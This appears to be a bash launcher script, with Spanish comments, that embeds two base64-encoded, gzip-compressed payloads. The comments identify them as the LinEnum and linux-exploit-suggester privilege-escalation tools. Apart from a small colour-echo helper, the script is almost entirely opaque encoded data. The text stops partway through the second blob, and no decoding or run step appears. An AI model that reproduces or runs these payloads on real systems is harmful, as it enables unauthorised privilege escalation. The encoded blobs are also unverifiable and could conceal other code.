#!/bin/bash
clear
if ! command -v lolcat >/dev/null 2>&1; then
	function lecho() {
		echo "$@"
			}
else
function lecho() { 
	echo "$@" | lolcat 
		}
fi


#### var para correr linenum

linenum="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"
#### var para correr linux-exploit-suggester
compressed="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
